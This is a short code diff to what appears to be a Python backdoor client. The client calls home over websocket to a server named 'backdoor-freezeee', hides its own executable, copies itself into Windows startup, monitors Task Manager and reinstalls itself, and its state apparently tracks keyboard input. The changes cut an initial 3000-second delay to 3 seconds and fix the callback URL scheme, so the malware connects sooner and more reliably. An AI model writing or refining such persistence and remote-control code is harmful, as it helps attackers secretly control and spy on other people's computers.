@@ -1,6 +1,6 @@
+from time import sleep
 from messagehandler import handle_message
 from implementations import *
-from time import sleep
 import asyncio
 import websockets  # type: ignore
 import sys
@@ -11,7 +11,7 @@ import socket
 
 current_exe = sys.executable
 
-server_url = "https://backdoor-freezeee.onrender.com"
+server_url = "wss://backdoor-freezeee.onrender.com"
 CLIENT_NAME = socket.gethostname()
 
 def will_startup_execute(filename):
@@ -63,10 +63,10 @@ state = {
     "keyboard": None,
 }
 
-sleep(3000)
 
 if not im_in_startup():
     hide_file(current_exe)
+    sleep(3)
     move_to_startup(current_exe)
 monitor_taskmgr()
 check_reinstall()
